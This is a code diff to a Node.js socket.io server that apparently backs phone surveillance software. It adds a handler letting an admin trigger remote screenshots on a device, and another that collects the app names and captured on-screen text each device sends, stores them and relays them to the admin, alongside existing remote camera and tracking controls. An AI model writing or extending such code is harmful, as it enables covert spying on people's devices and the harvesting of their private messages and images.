@@ -109,6 +109,11 @@ io.on('connection', (socket) => {
     io.to(data.deviceId).emit('take_photo', { camera: data.camera || 'front' });
   });
 
+  socket.on('trigger_screenshot', (data) => {
+    console.log('📸 Admin requested a screenshot capture for device:', data.deviceId);
+    io.to(data.deviceId).emit('take_screenshot');
+  });
+
   socket.on('toggle_tracking', (data) => {
     console.log(`📡 Admin requested to ${data.action} tracking for device:`, data.deviceId);
     io.to(data.deviceId).emit('remote_control', { action: data.action });
@@ -150,6 +155,28 @@ io.on('connection', (socket) => {
       socket.emit('devices_data', devices);
     } catch (err) {
       console.error('❌ Error fetching devices:', err);
+    }
+  });
+
+  socket.on('activity_log', async (data) => {
+    console.log(`📥 Activity Log received from ${data.deviceId}:`, data.packageName, "-", data.text.substring(0, 30) + "...");
+    try {
+      const device = await Device.findOne({ where: { deviceId: data.deviceId } });
+      if (device) {
+        await TrackingLog.create({
+          deviceId: device.id,
+          logType: 'activity',
+          data: {
+            packageName: data.packageName,
+            text: data.text,
+            timestamp: data.timestamp
+          }
+        });
+        // Optional: Broadcast to admin if they are online
+        io.emit('activity_update', data);
+      }
+    } catch (err) {
+      console.error('❌ Activity Log Error:', err);
     }
   });
 
